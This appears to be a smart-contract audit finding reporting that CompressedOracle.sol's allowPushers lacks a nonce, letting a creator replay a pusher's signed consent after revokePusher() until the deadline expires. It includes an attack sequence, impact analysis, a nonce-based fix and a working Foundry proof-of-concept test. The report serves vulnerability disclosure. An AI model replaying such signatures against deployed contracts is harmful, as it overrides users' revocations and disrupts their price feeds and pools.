### Title
Creator Can Re-Establish Pusher Delegation After `revokePusher()` Using Unexpired Signature, Permanently Hijacking Pusher Namespace Until Deadline Expires — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` signs consent over `(chainid, oracle, deadline, pusher, creator)` with no per-pusher nonce. After a pusher calls `revokePusher()` to clear `namespaceRemapping[pusher]`, the creator can immediately replay the original signature — which is still cryptographically valid as long as `block.timestamp ≤ deadline` — to re-establish `namespaceRemapping[pusher] = creator`. The pusher cannot stop this cycle until the deadline expires. Every push the pusher makes during this window lands in the creator's namespace instead of their own, leaving the pusher's own feeds permanently stale.

---

### Finding Description

`allowPushers` in `CompressedOracle.sol` constructs the signed hash as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no revocation counter, and no on-chain record that the pusher has ever revoked. `revokePusher()` only zeroes `namespaceRemapping[msg.sender]`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [2](#0-1) 

Because the signature is stateless and the only freshness gate is `_ensureDeadline(deadline)` (which passes while `block.timestamp ≤ deadline`), the creator can call `allowPushers` again with the identical `(deadline, [pusher], [sig])` tuple immediately after the pusher revokes, restoring `namespaceRemapping[pusher] = creator`. The code's own comment acknowledges the risk but treats the deadline as a complete fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [3](#0-2) 

The deadline prevents replay only after it expires; it does not prevent replay within the deadline window. The pusher is trapped until the deadline passes.

**Attack sequence:**

1. Pusher signs consent with `deadline = now + 30 days`.
2. Creator calls `allowPushers` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers` with the same `(deadline, sig)` → `namespaceRemapping[pusher] = creator` again.
5. Steps 3–4 repeat indefinitely; the pusher cannot win until day 30.

During this window every `fallback()` push from the pusher resolves `creator = namespaceRemapping[msg.sender]` to the creator's address:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

All slot writes land in the creator's namespace. The pusher's own namespace receives no updates; its `timestampMs` stays at zero, which every consumer rejects as stale.

---

### Impact Explanation

Any pool or `AnchoredPriceProvider` reading from the pusher's own feed namespace will see `timestampMs = 0`, which `_isStale` treats as stale:

```solidity
if (refTime == 0) return true;
``` [5](#0-4) 

`getBidAndAskPrice()` then reverts with `FeedStalled`, making every swap through the pusher's own pools permanently unusable for the duration of the deadline window. This is a broken core pool functionality causing unusable swap flows — a contest-relevant impact.

---

### Likelihood Explanation

The trigger requires only that the creator retain the original signed bytes (trivially true — they submitted them on-chain in the first `allowPushers` call, so they are in calldata history) and that the deadline has not yet expired. No special privilege, no fee, no new signature from the pusher is needed. Deadlines are typically set days or weeks in the future (the test uses `block.timestamp + 1 days`), giving the creator a large exploitation window. [6](#0-5) 

---

### Recommendation

Add a per-pusher revocation nonce stored in `namespaceRemapping` or a separate `mapping(address => uint256) public pusherNonce`. Increment it in `revokePusher()` and include it in the signed hash:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
```

After revocation the nonce increments, invalidating all previously issued signatures regardless of their deadline. The creator must obtain a fresh signature from the pusher to re-establish delegation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAfterRevokePoC is Test {
    CompressedOracleV1 oracle;
    uint256 pusherKey  = 0xBEEF;
    address pusher     = vm.addr(pusherKey);
    address creator    = address(0xC0FFEE);

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle = new CompressedOracleV1(address(this), 60_000);
    }

    function test_replayAfterRevoke() public {
        uint256 deadline = block.timestamp + 30 days;

        // 1. Pusher signs consent
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature — succeeds, deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // Pusher's revocation is undone — delegation restored without pusher's consent
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established after revoke");
    }
}
```
